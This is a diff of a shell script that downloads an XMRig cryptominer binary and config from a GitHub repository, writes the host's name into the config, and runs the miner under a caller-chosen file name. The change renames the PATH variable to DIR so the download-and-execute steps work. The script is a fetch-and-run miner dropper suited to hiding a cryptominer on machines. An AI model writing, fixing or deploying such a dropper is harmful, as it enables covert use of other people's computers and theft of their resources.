@@ -3,12 +3,12 @@
 CONFIG="https://raw.githubusercontent.com/blackUser623/xm/main/config.json"
 TERMINAL="https://raw.githubusercontent.com/blackUser623/xm/main/xmrig"
 PASS=$(hostname)
-PATH="$1"
+DIR="$1"
 FILE="$2"
 
-wget ${CONFIG} -O ${PATH}config.json
-wget ${TERMINAL} -O ${PATH}${FILE}
+wget ${CONFIG} -O ${DIR}config.json
+wget ${TERMINAL} -O ${DIR}${FILE}
 
-sed -i "s/xxxxx/${PASS}/g" ${PATH}config.json
+sed -i "s/xxxxx/${PASS}/g" ${DIR}config.json
 
-cd ${PATH} && $FILE || exit
+cd ${DIR} && $FILE || exit
